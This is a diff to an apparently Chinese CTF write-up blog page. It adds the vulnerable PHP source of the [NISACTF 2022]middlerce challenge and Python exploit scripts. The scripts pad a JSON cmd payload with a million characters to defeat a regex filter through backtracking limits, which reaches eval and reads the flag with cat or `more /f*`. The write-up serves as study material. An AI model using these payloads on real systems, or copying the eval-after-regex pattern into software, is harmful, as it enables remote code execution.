@@ -294,6 +294,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://be940679-bb09-40a2-bc67-bebd5b39a911.node4.buuoj.cn:81/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://be940679-bb09-40a2-bc67-bebd5b39a911.node4.buuoj.cn:81/&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
 <p>两个的意思是一样的。</p>
+<p>这题用的是绝对路径，找一题同样是回溯的利用相对路径命令的题目 <strong>[NISACTF 2022]middlerce</strong> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;</span><br><span class="line">    $txw4ever = $_REQUEST[&#x27;letter&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;</span><br><span class="line">        die(&quot;再加把油喔&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];</span><br><span class="line">        checkdata($command);</span><br><span class="line">        @eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `more /f*`?&gt;&quot;,&quot;zz&quot;:&quot;&#x27; + &quot;.&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://1.14.71.254:28984/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p>linux常用于读取文件内容指令主要有七种：cat,tac,nl,more,less,head,tail</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012062455/article/details/78560403">linux常用的读取文件内容指令 linux读取文件</a></p>
 </section>
     <!-- Tags START -->
     
@@ -310,6 +316,13 @@
         
       </a>
     
+    
+      <a class="nav-right" href="/2022/04/12/misc%E4%B9%8B%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+        
+          misc之内存取证
+        
+        <span class="nav-arrow"> →</span>
+      </a>
     
   </div>
 
